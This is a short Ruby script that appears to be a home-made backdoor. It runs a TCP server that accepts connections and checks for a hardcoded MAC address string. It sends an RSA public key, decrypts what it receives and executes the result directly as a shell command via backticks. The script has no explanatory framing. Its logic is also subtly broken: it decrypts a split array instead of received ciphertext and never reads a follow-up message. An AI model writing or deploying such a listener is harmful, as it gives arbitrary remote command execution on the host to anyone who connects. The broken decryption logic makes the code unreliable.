require 'socket'
require 'digest/sha1'
require "openssl"

priv_key = OpenSSL::PKey::RSA.new(1024)
pub_key = priv_key.public_key

host = ARGV[0] || 'localhost'
port = (ARGV[1] || 8888).to_i

server = TCPServer.new(host, port)

while session = server.accept
  begin
		temp = session.recv(100)
		recv_data = temp.split('"')
		if recv_data[1] === '00:0c:29:be:90:f1'
		#	puts "Connection made...sending public key.\n\n"
		#	puts pub_key
		session.print pub_key
		puts "Public key sent, waiting on data...\n\n"
		puts "Received data..."
		msg = priv_key.private_decrypt(recv_data)
		#rescue => e
		#	puts "Something terrible happened while receiving and decrypting."
		#	puts e
		#end
    puts "Executing command: #{msg}"
    `#{msg}`
		else
	    puts "The message could not be validated!"
			puts false
		end
  end
end
